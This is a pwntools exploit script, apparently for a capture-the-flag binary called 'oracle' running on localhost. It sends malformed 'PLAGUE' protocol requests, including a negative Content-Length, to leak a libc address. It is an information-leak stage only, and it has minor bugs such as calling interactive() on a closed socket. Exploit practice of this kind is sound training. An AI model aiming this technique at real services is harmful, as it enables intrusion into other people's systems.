from pwn import *

context.arch = 'x86_64'
context.log_level = 'debug'
exe = './oracle'
elf = ELF('./oracle')
#libc = ELF('libc')
#ld = ELF('ld')

def start(argv=[], *a, **kw):
    if(sys.argv[1] == "d"):
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif(sys.argv[1] == "r"):
        return remote('localhost',9001)
    elif(sys.argv[1] == "l"):
        return process([exe] + argv, *a, **kw)

def s(a) : return io.send(a)
def sl(a) : return io.sendline(a)
def sa(a,b) : return io.sendafter(a,b)
def sla(a,b) : return io.sendlineafter(a,b)
def r(a) : return io.recv(a)
def ru(a) : return io.recvuntil(a)
def ra(a) : return io.recvall(a)
def rl() : return io.recvline()
def i() : return io.interactive()
def cls() : return io.close()
def p(a) : return log.info(a)
def suck(a) : return log.success(a)

gdbscript = '''
b main
c
'''.format(**locals())

#==========================================================
'''
 _   _                 _    _        _____                   
| | | |               | |  | |      |  __ \                  
| |_| | ___ _ __ ___  | |  | | ___  | |  \/ ___              
|  _  |/ _ \ '__/ _ \ | |/\| |/ _ \ | | __ / _ \             
| | | |  __/ | |  __/ \  /\  /  __/ | |_\ \ (_) |  _   _   _ 
\_| |_/\___|_|  \___|  \/  \/ \___|  \____/\___/  (_) (_) (_)
                                                             
'''                                                                                                                                                                                             
#==========================================================


r = start()

# Stage 1

# r = remote("localhost", 9001)
r.send("PLAGUE hehe V1337\r\n")
r.send("Plague-Target: haha\r\n")
r.send("Content-Length: -1\r\n")
r.send("\r\n")
r.send("A")
r.recvuntil("plague: ")
r.close()

# Stage 2

r = remote("localhost", 9001)
r.send("PLAGUE hehe V1337\r\n")
r.send("Plague-Target: haha\r\n")
r.send("Content-Length: 8\r\n")
r.send("\r\n")
r.send("A")
r.recvuntil("plague: ")
libc_leak = u64(r.recv(6)+b"\x00\x00") - 0x1ecb41
p("Libc => %s" % hex(libc_leak))
r.close()

r.interactive()